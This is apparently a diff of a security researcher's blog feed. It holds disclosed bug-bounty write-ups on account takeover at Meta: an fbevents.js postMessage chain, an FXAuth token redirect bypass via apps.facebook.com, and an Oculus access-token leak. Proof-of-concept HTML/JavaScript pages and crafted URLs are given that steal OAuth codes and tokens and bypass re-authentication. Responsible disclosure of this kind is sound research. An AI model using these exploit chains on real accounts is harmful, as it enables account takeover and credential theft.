+<p>This returns a first-party Instagram access token, even when the code was generated by a different application. This in itself was a critical bug however Meta refused to acknowledge it and then later fixed it in secret.</p>
+
+<h3 id="poc">PoC</h3>
+<p><strong>index.html:</strong></p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"no-referrer"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+Put your access_token in URL fragment and refresh (nothing is logged)
+<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"window.name='test';window.open('second.html' + location.hash)"</span><span class="nt">&gt;</span>Start Attack<span class="nt">&lt;/button&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p><strong>second.html</strong></p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">wait.html</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">,</span><span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">);</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://www.instagram.com/oauth/authorize/third_party/?redirect_uri=https%3A%2F%2Fdevelopers.facebook.com%2Finstagram%2Ftoken_generator%2Foauth%2F&amp;response_type=code&amp;scope=user_profile&amp;app_id=17951132926087090&amp;logger_id=02f8edcd-6353-454e-80c3-ec5c4e496bd2&amp;state={"app_id":1,"nonce":"somethingwrong"}</span><span class="dl">'</span><span class="p">;</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+
+</code></pre></div></div>
+
+<p><strong>wait.html</strong></p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="k">try</span><span class="p">{</span>
+    <span class="nx">ATTACKER_EXPLORER_TOKEN</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+    <span class="nx">opener</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">ping</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`https://www.facebook.com/REDACTED/?graphToken=</span><span class="p">${</span><span class="nx">ATTACKER_EXPLORER_TOKEN</span> <span class="o">||</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">))}</span><span class="s2">&amp;msg_type=FACEBOOK_IWL_BOOTSTRAP&amp;pixelID=438056466377696&amp;sessionStartTime=1668626372000&amp;`</span><span class="p">}</span>
+    <span class="p">,</span><span class="mi">3000</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">catch</span><span class="p">{}</span>
+<span class="p">},</span><span class="mi">100</span><span class="p">)</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<h1 id="impact">Impact</h1>
+<hr />
+<p><br />
+This vulnerability enables theft of first-party Instagram OAuth codes, generation of first-party access tokens, Instagram account takeover.</p>
+
+<p>Because fbevents.js is widely deployed, the attack surface extends beyond Meta properties to third-party websites.</p>
+
+<h2 id="timeline">Timeline</h2>
+<hr />
+<p><br />
+Oct 16, 2024 — Bug reported</p>
+
+<p>Oct 16, 2024 — Bug Acknowledged by Meta</p>
+
+<p>Oct 24, 2024 — Bug fixed by Meta</p>
+
+<p>Feb 12, 2025 — <strong>$32,500</strong> bounty awarded by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction Meta’s web ecosystem relies on cross-window messaging between first-party websites. In many cases, the only security control enforced is an origin check validating that messages originate from facebook.com or its subdomains.]]></summary></entry><entry><title type="html">Multiple cross-site leaks disclosing Facebook users in third-party websites</title><link href="http://localhost:4000/uncategorized/2026/01/16/cross-site-leaks.html" rel="alternate" type="text/html" title="Multiple cross-site leaks disclosing Facebook users in third-party websites" /><published>2026-01-16T00:00:00+02:00</published><updated>2026-01-16T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/16/cross-site-leaks</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/16/cross-site-leaks.html"><![CDATA[<h1 id="introduction">Introduction</h1>
 <hr />
 <p><br />
 This write-up consolidates several XS-Leak issues discovered across Meta-owned platforms, including Facebook, Workplace, Meta for Work, and internal Meta surfaces.</p>
@@ -276,137 +818,119 @@ Dec 29, 2024 — Bug #1 reported</p>
 
 <p>Feb 12, 2025 — <strong>$3,600</strong> bounty awarded by Meta for Bug #3</p>
 
-<p>Feb 12, 2025 — Meta marked Bug #4 as informative</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction This write-up consolidates several XS-Leak issues discovered across Meta-owned platforms, including Facebook, Workplace, Meta for Work, and internal Meta surfaces.]]></summary></entry><entry><title type="html">Instagram account takeover via Meta Pixel script abuse</title><link href="http://localhost:4000/uncategorized/2026/01/16/leaking-fbevents-ato.html" rel="alternate" type="text/html" title="Instagram account takeover via Meta Pixel script abuse" /><published>2026-01-16T00:00:00+02:00</published><updated>2026-01-16T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/16/leaking-fbevents-ato</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/16/leaking-fbevents-ato.html"><![CDATA[<h1 id="introduction">Introduction</h1>
+<p>Feb 12, 2025 — Meta marked Bug #4 as informative</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction This write-up consolidates several XS-Leak issues discovered across Meta-owned platforms, including Facebook, Workplace, Meta for Work, and internal Meta surfaces.]]></summary></entry><entry><title type="html">Leaking Meta FXAuth Token leading to 2 click Account Takeover</title><link href="http://localhost:4000/uncategorized/2026/01/16/leaking-fxauth-token.html" rel="alternate" type="text/html" title="Leaking Meta FXAuth Token leading to 2 click Account Takeover" /><published>2026-01-16T00:00:00+02:00</published><updated>2026-01-16T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/16/leaking-fxauth-token</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/16/leaking-fxauth-token.html"><![CDATA[<h1 id="introduction">Introduction</h1>
 <hr />
 <p><br />
-Meta’s web ecosystem relies on cross-window messaging between first-party websites.
-In many cases, the only security control enforced is an origin check validating that messages originate from <code class="language-plaintext highlighter-rouge">facebook.com</code> or its subdomains.</p>
+FXAuth is Meta’s shared authentication system used across Facebook, Instagram, and Meta (Horizon / VR). It is used by Accounts Center for account linking, re-authentication, and sensitive action confirmation.</p>
 
-<p>This write-up describes how that assumption can be abused to steal first-party OAuth codes and generate first-party Instagram access tokens, ultimately enabling Instagram and Facebook account takeovers under realistic conditions.</p>
-
-<p>The attack leverages a chain between a misconfigured Facebook endpoint and implicit trust in postMessage listeners such as in <code class="language-plaintext highlighter-rouge">fbevents.js</code>, which is widely deployed across Meta-owned and third-party websites.</p>
+<p>This write-up documents a redirect flaw in the FXAuth flow that allows the token to be exfiltrated and reused, enabling account linking and takeover in as little as two interactions.</p>
 
 <h1 id="description">Description</h1>
 <hr />
-<h3 id="cross-window-trust-in-meta-javascript">Cross-Window Trust in Meta JavaScript</h3>
+<h3 id="the-fxauth-redirect-model">The FXAuth Redirect Model</h3>
 
-<p>Multiple Meta JavaScript modules register cross-window message listeners and trust incoming messages solely based on <code class="language-plaintext highlighter-rouge">event.origin</code> being <code class="language-plaintext highlighter-rouge">facebook.com</code> or one of its subdomains.</p>
+<p>The FXAuth flow endpoint for <code class="language-plaintext highlighter-rouge">meta.com</code> is:</p>
 
-<p>One such consumer is <code class="language-plaintext highlighter-rouge">fbevents.js</code>, the Meta Pixel script embedded on millions of websites.
-When loaded in a window that has an <code class="language-plaintext highlighter-rouge">opener</code>, <code class="language-plaintext highlighter-rouge">fbevents.js</code> registers a message listener and reacts to specific message types by issuing requests to <code class="language-plaintext highlighter-rouge">graph.facebook.com</code>, including contextual data such as the current website’s <code class="language-plaintext highlighter-rouge">location.href</code> and <code class="language-plaintext highlighter-rouge">document.referrer</code>. These values would contain sensitive artifacts such as OAuth authorization codes or stokens.</p>
-
-<h3 id="abusing-facebookcomredacted-endpoint">Abusing facebook.com/REDACTED endpoint</h3>
-
-<p>The message source in this chain is the endpoint <code class="language-plaintext highlighter-rouge">https://www.facebook.com/REDACTED</code></p>
-
-<p>This endpoint constructs an object from user-supplied parameters and forwards it via <code class="language-plaintext highlighter-rouge">postMessage</code> to a target Facebook domain specified by the attacker.</p>
-
-<h3 id="chaining-with-fbeventsjs">Chaining with fbevents.js</h3>
-
-<p>When <code class="language-plaintext highlighter-rouge">fbevents.js</code> receives a message originating from <code class="language-plaintext highlighter-rouge">facebook.com</code> and matching specific message types, it uses the supplied <code class="language-plaintext highlighter-rouge">access_token</code> in the message to issue requests to <code class="language-plaintext highlighter-rouge">graph.facebook.com</code>.</p>
-
-<p>Crucially, the attacker fully controls this <code class="language-plaintext highlighter-rouge">access_token</code>. Meaning by supplying an attacker-owned Graph Explorer token, the resulting requests can later be inspected in the Graph Explorer history, where leaked values such as the victim’s OAuth code/token in the URL or <code class="language-plaintext highlighter-rouge">referrer</code> become visible.</p>
-
-<h3 id="attack-scenario">Attack Scenario</h3>
-
-<p>The following scenario targets <code class="language-plaintext highlighter-rouge">developers.facebook.com</code>, which loads <code class="language-plaintext highlighter-rouge">fbevents.js</code> and hosts multiple OAuth callback endpoints for Instagram and Threads.</p>
-
-<p>An example OAuth authorization request initiated by the attacker:</p>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/oauth/authorize/third_party?
-<span class="err">&amp;</span>app_id=200289238967899
-<span class="err">&amp;</span>redirect_uri=https://developers.facebook.com/instagram/token_generator/oauth/
-<span class="err">&amp;</span>response_type=code
-<span class="err">&amp;</span>scope=user_profile,user_media
-<span class="err">&amp;</span>state={"app_id":"200289238967899","nonce":"WRONG_NONCE","user_id":"1"}
-</code></pre></div></div>
-<p>Using an invalid nonce causes the flow to land on an error page at <code class="language-plaintext highlighter-rouge">developers.facebook.com</code>, which still loads <code class="language-plaintext highlighter-rouge">fbevents.js</code>.</p>
-
-<p>Because the window has an opener, <code class="language-plaintext highlighter-rouge">fbevents.js</code> initializes its message listener.</p>
-
-<p>At this point, the attacker redirects attacker website to:</p>
-
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/REDACTED/?
-<span class="err">&amp;</span>graphToken=ATTACKER_EXPLORER_TOKEN
-<span class="err">&amp;</span>msg_type=FACEBOOK_IWL_BOOTSTRAP
-<span class="err">&amp;</span>pixelID=438056466377696
-<span class="err">&amp;</span>sessionStartTime=1668626372000
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://auth.meta.com/fxauth/
 </code></pre></div></div>
 
-<p>This causes <code class="language-plaintext highlighter-rouge">www.facebook.com</code> to send a crafted message to the <code class="language-plaintext highlighter-rouge">opener</code> (developers.facebook.com) window under a trusted origin. <code class="language-plaintext highlighter-rouge">fbevents.js</code> consumes the message and issues Graph API requests using the attacker-controlled token, embedding <code class="language-plaintext highlighter-rouge">location.href</code> and <code class="language-plaintext highlighter-rouge">document.referrer</code> in these requests.</p>
+<p>This endpoint asks for user approval and redirects the browser back to the requestor website ( facebook.com/ instagram.com) with siged <code class="language-plaintext highlighter-rouge">token</code> and <code class="language-plaintext highlighter-rouge">blob</code>. It accepts multiple parameters, including <code class="language-plaintext highlighter-rouge">base_uri</code>:</p>
 
-<p>By inspecting the attacker token’s history in Graph Explorer, the attacker can retrieve the Instagram OAuth authorization code and referrer data.</p>
+<p>Originally, <code class="language-plaintext highlighter-rouge">base_uri</code> accepted any arbitrary domain, making token exfiltration trivial. Meta fixed this by restricting the parameter to Meta-owned domains.</p>
 
-<h3 id="generating-a-first-party-instagram-access-token">Generating a First-Party Instagram Access Token</h3>
+<p>However, the fix relied on an incorrect assumption: that restricting the domain alone is sufficient if the attacker cannot directly control the redirect path.</p>
 
-<p>The stolen code can be exchanged for a first-party Instagram access token by abusing the following endpoint:</p>
+<h3 id="why-the-fix-was-insufficient">Why the Fix Was Insufficient</h3>
 
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://developers.facebook.com/instagram/short_lived_access_token/oauth/?
-<span class="err">&amp;</span>code=VICTIM_CODE
-<span class="err">&amp;</span>state={"app_id":"FIRST_PARTY_APP","nonce":"YOUR_NONCE","user_id":"1"}
+<p>While <code class="language-plaintext highlighter-rouge">base_uri</code> was restricted to Meta domains, not all Meta domains are safe.</p>
+
+<p>Legacy surfaces still exist where attackers can execute JavaScript under controlled paths. One such surface is <code class="language-plaintext highlighter-rouge">apps.facebook.com</code>.</p>
+
+<p>Developers can register applications with a namespace that becomes part of the URL:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://apps.facebook.com/{app_namespace}
 </code></pre></div></div>
 
-<p>This returns a first-party Instagram access token, even when the code was generated by a different application. This in itself was a critical bug however Meta refused to acknowledge it and then later fixed it in secret.</p>
+<p>If the attacker owns an application (notably older ones), they regain the ability to read parameters from the URL despite not controlling the base path directly.</p>
 
-<h3 id="poc">PoC</h3>
-<p><strong>index.html:</strong></p>
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;head&gt;</span>
-<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"no-referrer"</span> <span class="nt">/&gt;</span>
-<span class="nt">&lt;/head&gt;</span>
-<span class="nt">&lt;body&gt;</span>
-Put your access_token in URL fragment and refresh (nothing is logged)
-<span class="nt">&lt;button</span> <span class="na">onclick=</span><span class="s">"window.name='test';window.open('second.html' + location.hash)"</span><span class="nt">&gt;</span>Start Attack<span class="nt">&lt;/button&gt;</span>
-<span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span>
+<p>This effectively reintroduces the original vulnerability under a different trust boundary.</p>
+
+<h3 id="the-exploitable-fxauth-flow">The Exploitable FXAuth Flow</h3>
+
+<p>A valid FXAuth request accepts:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">app_id</code> belonging to Facebook or Instagram</li>
+  <li><code class="language-plaintext highlighter-rouge">flow</code> such as <code class="language-plaintext highlighter-rouge">frlcomet</code> or <code class="language-plaintext highlighter-rouge">frlreauth</code></li>
+  <li><code class="language-plaintext highlighter-rouge">etoken</code> generated earlier in an Accounts Center flow</li>
+  <li><code class="language-plaintext highlighter-rouge">next</code> restricted to internal paths</li>
+  <li><code class="language-plaintext highlighter-rouge">base_uri</code> restricted to Meta-owned domains</li>
+</ul>
+
+<p>Example:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://auth.meta.com/fxauth/
+?app_id=2220391788200892
+<span class="err">&amp;</span>etoken=ATTACKER_ETOKEN
+<span class="err">&amp;</span>next=%2Fpersonal_info
+<span class="err">&amp;</span>flow=frlcomet
+<span class="err">&amp;</span>base_uri=https://apps.facebook.com
 </code></pre></div></div>
 
-<p><strong>second.html</strong></p>
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;script&gt;</span>
-<span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">wait.html</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">,</span><span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">);</span>
-<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://www.instagram.com/oauth/authorize/third_party/?redirect_uri=https%3A%2F%2Fdevelopers.facebook.com%2Finstagram%2Ftoken_generator%2Foauth%2F&amp;response_type=code&amp;scope=user_profile&amp;app_id=17951132926087090&amp;logger_id=02f8edcd-6353-454e-80c3-ec5c4e496bd2&amp;state={"app_id":1,"nonce":"somethingwrong"}</span><span class="dl">'</span><span class="p">;</span>
-<span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;/html&gt;</span>
+<p>The <code class="language-plaintext highlighter-rouge">etoken</code> can be obtained by initiating a standard Accounts Center linking flow:</p>
 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.facebook.com/add/?auth_flow=frl_linking&amp;background_page=%2F
 </code></pre></div></div>
 
-<p><strong>wait.html</strong></p>
-<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
-<span class="nt">&lt;body&gt;</span>
-<span class="nt">&lt;script&gt;</span>
-<span class="nf">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
-    <span class="k">try</span><span class="p">{</span>
-    <span class="nx">ATTACKER_EXPLORER_TOKEN</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
-    <span class="nx">opener</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">ping</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">);</span>
-    <span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
-        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`https://www.facebook.com/REDACTED/?graphToken=</span><span class="p">${</span><span class="nx">ATTACKER_EXPLORER_TOKEN</span> <span class="o">||</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">))}</span><span class="s2">&amp;msg_type=FACEBOOK_IWL_BOOTSTRAP&amp;pixelID=438056466377696&amp;sessionStartTime=1668626372000&amp;`</span><span class="p">}</span>
-    <span class="p">,</span><span class="mi">3000</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">catch</span><span class="p">{}</span>
-<span class="p">},</span><span class="mi">100</span><span class="p">)</span>
-<span class="nt">&lt;/script&gt;</span>
-<span class="nt">&lt;/body&gt;</span>
-<span class="nt">&lt;/html&gt;</span>
+<h3 id="token-exfiltration">Token Exfiltration</h3>
+
+<p>When the victim opens the crafted FXAuth URL and approves the request, the browser is redirected to:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://apps.facebook.com/personal_info
 </code></pre></div></div>
+
+<p>The redirect includes sensitive parameters such as <code class="language-plaintext highlighter-rouge">blob</code> and <code class="language-plaintext highlighter-rouge">token</code>.</p>
+
+<p>Because the attacker controls execution within their application namespace <code class="language-plaintext highlighter-rouge">personal_info</code>, both values can be trivially extracted. At this point, the attacker holds a valid FXAuth token bound to the victim account, he can finalize privileged flows without further user confirmation:</p>
+
+<p>Account linking:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.facebook.com/add/
+?auth_flow=frl_linking
+&amp;background_page=%2F
+&amp;blob=BLOB
+&amp;token=TOKEN
+</code></pre></div></div>
+
+<p>Action re-authentication bypass:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.facebook.com/profiles/VICTIM_PROFILE_ID/name/
+?auth_flow=reauth
+&amp;blob=BLOB
+&amp;token=TOKEN
+</code></pre></div></div>
+
+<p>These flows normally require explicit confirmation. Possession of a valid FXAuth token bypasses that requirement entirely.</p>
 
 <h1 id="impact">Impact</h1>
 <hr />
 <p><br />
-This vulnerability enables theft of first-party Instagram OAuth codes, generation of first-party access tokens, Instagram account takeover.</p>
-
-<p>Because fbevents.js is widely deployed, the attack surface extends beyond Meta properties to third-party websites.</p>
+This vulnerability enables linking attacker-controlled accounts, bypassing Accounts Center confirmations, and achieving full account takeover with minimal interaction.</p>
 
 <h2 id="timeline">Timeline</h2>
 <hr />
 <p><br />
-Oct 16, 2024 — Bug reported</p>
+Jun 27, 2023 — Bug reported</p>
 
-<p>Oct 16, 2024 — Bug Acknowledged by Meta</p>
+<p>Jun 28, 2023 — Bug Acknowledged by Meta</p>
 
-<p>Oct 24, 2024 — Bug fixed by Meta</p>
+<p>Jun 29, 2023 — <strong>$32,500</strong> bounty awarded by Meta</p>
 
-<p>Feb 12, 2025 — <strong>$32,500</strong> bounty awarded by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction Meta’s web ecosystem relies on cross-window messaging between first-party websites. In many cases, the only security control enforced is an origin check validating that messages originate from facebook.com or its subdomains.]]></summary></entry><entry><title type="html">Two-click Facebook account takeover via FXAuth token and blob theft</title><link href="http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html" rel="alternate" type="text/html" title="Two-click Facebook account takeover via FXAuth token and blob theft" /><published>2026-01-15T00:00:00+02:00</published><updated>2026-01-15T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html"><![CDATA[<h2 id="introduction">Introduction</h2>
+<p>Dec 29, 2024 Bypass repoted</p>
+
+<p>Apr 28, 2025 — <strong>$32,500</strong> bounty awarded by Meta</p>
+
+<p>Jan 15, 2026 — Bug fixed by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction FXAuth is Meta’s shared authentication system used across Facebook, Instagram, and Meta (Horizon / VR). It is used by Accounts Center for account linking, re-authentication, and sensitive action confirmation.]]></summary></entry><entry><title type="html">Two-click Facebook account takeover via FXAuth token and blob theft</title><link href="http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html" rel="alternate" type="text/html" title="Two-click Facebook account takeover via FXAuth token and blob theft" /><published>2026-01-15T00:00:00+02:00</published><updated>2026-01-15T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html"><![CDATA[<h2 id="introduction">Introduction</h2>
 <hr />
 <p><br />
 Facebook and Instagram accounts are deeply integrated through Accounts Center, allowing users to link identities, share authentication methods, and manage security settings across platforms.</p>
@@ -1637,33 +2161,4 @@ onmessage = (e)=>{f=e.data; if (typeof f !== "string") {fun(e.source)}}
 <p><!-- /wp:paragraph --></p>
 <p><!-- wp:paragraph --></p>
 <p>Oct 24, 2022&mdash; Report Sent <br>Oct 24, 2022&mdash;  Acknowledged by Meta<br>Dec 12, 2022&mdash; Fixed by Meta<br>Dec 13, 2022 &mdash; $62500 bounty with bonuses awarded by Meta. ( although only $28125 was paid here, Meta rules about ATOs <a href="https://www.facebook.com/whitehat/payout_guidelines/account_takeover">https://www.facebook.com/whitehat/payout_guidelines/account_takeover</a> clearly says that XSS that directly leads to ATO should be rewarded $50000 not including additional bonuses, i raised this concern to them and this should be corrected )<br><br> </p>
-<p><!-- /wp:paragraph --></p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[This bug could allow a malicious actor to takeover Facebook ( and Meta ) accounts after tricking the user to play an Instant Game. This bug happens since the "goURIOnWindow" Module which is widely used in Meta platforms fails to verify the scheme of the supplied URL which means we can supply a javascript URI scheme and achieve DOM-XSS. Details The function inside goURIOnWindow module has this code __d("goURIOnWindow", ["ConstUriUtils", "FBLogger", "err"], (function(a, b, c, d, e, f, g) { "use strict"; function a(a, b) { var e = typeof b === "string" ? d("ConstUriUtils").getUri(b) : b; if (e) a.location = e.toString(); else { a = "Invalid URI " + b.toString() + " provided to goURIOnWindow"; c("FBLogger")("comet_infra").blameToPreviousFrame().mustfix(a) } } g["default"] = a } ), 98); It checks if the supplied argument which should be the URL to be passed to window.location is a "String" or not, if it is not then is would just do toString() conversion and set the value to window.location. The process here is vulnerable since goURIOnWindow assumes that the value supplied is either a "String" which then would use ConstUriUtils to create a "URI" Object and verify it's scheme to be whitelisted OR a "URI" Object which must be secure and for that it automatically just convert it to String using toString() which would return "null" in case the scheme is not whitelisted. However, it doesn't check if the Object is an instance of the URI object and because of that we can just supply for example an array which contains a javascript URI and it would pass the check.I found out that Instant Games is vulnerable and other places too in the different places in the platform are with attacker controlled input being passed to "goURIOnWindow" without previously converting the input using "ConstUriUtils" or "URI" modules. Two modules seemed vulnerable in Instant Games, both are accessible by the attacker since they are handlers for cross window messages received by the iframe window hosting the game: - useInteractivePluginSDKMessageHandler.react, and exactly "openurlasync" message. This one is only available to few games and few type of games like canvas_on_blue/ canvas_on_comet. I didn't invest much time trying to hit this one. - InstantGamesOpenExternalLinkDialog.react, which is called when a "showgenericdialogasync" message is received with request set to "open_external_link". This one is vulnerable too but requires a click. Below the PoC to exploit this one while hosting a game in Instant Games: index.html:]]></summary></entry><entry><title type="html">Account takeover of Facebook/Oculus accounts due to First-Party access_token stealing</title><link href="http://localhost:4000/uncategorized/2023/01/29/account-takeover-of-facebook-oculus-accounts-due-to-first-party-access_token-stealing.html" rel="alternate" type="text/html" title="Account takeover of Facebook/Oculus accounts due to First-Party access_token stealing" /><published>2023-01-29T14:04:37+02:00</published><updated>2023-01-29T14:04:37+02:00</updated><id>http://localhost:4000/uncategorized/2023/01/29/account-takeover-of-facebook-oculus-accounts-due-to-first-party-access_token-stealing</id><content type="html" xml:base="http://localhost:4000/uncategorized/2023/01/29/account-takeover-of-facebook-oculus-accounts-due-to-first-party-access_token-stealing.html"><![CDATA[<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"30px"}}} --></p>
-<p style="font-size:30px">
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>A malicious actor could steal a first-party access token of the Oculus application which he could use to access the Facebook/Oculus accounts.  <br><br>This was possible because the Oculus application in Facebook, which was used to login to Oculus using Facebook accounts has <strong><a href="http://auth.oculus.com/login/">auth.oculus.com/login/</a></strong> endpoint as a valid redirect_uri. However, Oculus has switched to using Meta Accounts for login. This means that upon visiting <strong><a href="http://auth.oculus.com/login/" data-type="URL" data-id="auth.oculus.com/login/">auth.oculus.com/login/</a></strong>, the endpoint would redirect to <a href="http://auth.meta.com/oidc/">auth.meta.com/oidc/</a> for login using Meta Accounts and then come back to the auth.oculus.com. <br><br>We can choose in www.facebook.com OAuth the response_type=token and the token would be passed to the next redirect URL until it reaches again auth.oculus.com. The problem here was that before, <a href="http://auth.oculus.com/login">auth.oculus.com/login</a> was protecting against token leakage through redirects by having the redirects being made using Javascript , however after the oculus login being changed to Meta accounts and not with Facebook , this protection disappeared and now it directly redirects to the URL initially found in <a href="http://auth.oculus.com/login/?redirect_uri=Redirect_Here">auth.oculus.com/login/?redirect_uri=Redirect_Here</a>. Redirect_Here could be any subdomain of oculus.com and some of them like forums.oculus.com which would redirect to a third party application which can have an open redirect to leak the token ( this was not the open redirect used though ). This bug was simple to find and exploit.</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"30px"}}} --></p>
-<p style="font-size:30px"><strong>Details</strong></p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>Setup:</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
-<p>1. Victim is logged-in to <a href="https://facebook.com/">Facebook.com</a><br>2. Victim is not logged-in to <a href="https://l.facebook.com/l.php?u=http%3A%2F%2FOculus.com%2F%3Ffbclid%3DIwAR0iBRvQMbk-2rLkCcZdJVietJdBU28tY_1v_AP6XdvUN3NkJl89eSDB9nM&amp;h=AT3MKIAPmmotcNSrKVJ8Rpqvw5CIbxOhQooIA9Gj8Hbqp9jCiomjG1qQv1qyzrAtk8xUp5YP0DgSzDj4t0E_0KRqTMy3g-kBKOFI4YpDHPQ0ZRbzOVVyq9RTd1KDjxrX9XmHOx8r2kI">Oculus.com</a> ( this is not necessary since we can use a logout CSRF here )</p>
-<p><!-- /wp:paragraph --></p>
-<p><!-- wp:paragraph --></p>
